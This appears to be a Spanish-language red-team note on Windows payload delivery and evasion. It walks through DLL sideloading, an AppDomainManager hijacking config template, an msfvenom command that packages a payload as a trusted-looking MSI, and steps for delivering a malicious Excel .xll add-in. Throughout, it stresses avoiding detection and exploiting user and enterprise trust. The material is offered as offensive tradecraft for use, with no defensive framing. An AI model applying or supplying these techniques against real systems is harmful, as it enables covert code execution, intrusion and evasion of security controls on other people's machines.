---
tags: [initial-access, payload, evasion]
status: done
platform: windows
---

# Payloads

> Técnicas para ejecutar código en el sistema objetivo sin ser detectado.

---

## DLL Sideloading

Abusar de una aplicación legítima que carga DLLs desde su directorio sin firma forzada.

```
1. Encontrar app vulnerable (Process Monitor → filtro "NAME NOT FOUND" + ".dll")
2. Crear DLL maliciosa con el nombre esperado
3. Colocar DLL en el mismo directorio que la app legítima
4. Ejecutar la app → carga nuestra DLL
```

**Ventaja:** El proceso padre es legítimo y firmado → PPID limpio.

---

## AppDomainManager Hijacking

Abusa del mecanismo de inicio de .NET. Cuando un proceso .NET arranca, busca un `AppDomainManager` personalizado vía configuración.

```
Estructura:
  TargetApp.exe
  TargetApp.exe.config     ← define el AppDomainManager
  MaliciousDomain.dll      ← nuestra DLL .NET

Contenido del .config:
<configuration>
  <runtime>
    <appDomainManagerType value="EvilManager" />
    <appDomainManagerAssembly value="MaliciousDomain, Version=1.0.0.0, ..." />
  </runtime>
</configuration>
```

**Ventaja:** El runtime .NET lo carga automáticamente, sin shellcode ni inyección clásica.

---

## MSI Installer

Packaging de payload como MSI legítimo:

```powershell
# Con msfvenom
msfvenom -p windows/x64/exec CMD=payload.exe -f msi > installer.msi

# Con WiX Toolset (más convincente)
# Ver documentación WiX para CustomAction maliciosa
```

**Ventaja:** MSI es un formato de confianza en empresas. SmartScreen menos agresivo.

---

## Excel Add-ins (.xll)

DLL especial cargada por Excel como complemento:

```
1. Crear DLL que exporte xlAutoOpen()
2. Renombrar a .xll
3. Entregar como "Excel Add-in"
4. Usuario abre el .xll → Excel lo carga → xlAutoOpen ejecuta
```

---

## Droppers

→ Ver [[Droppers]] para: GadgetToJScript, .NET Class Library, embedded resources.

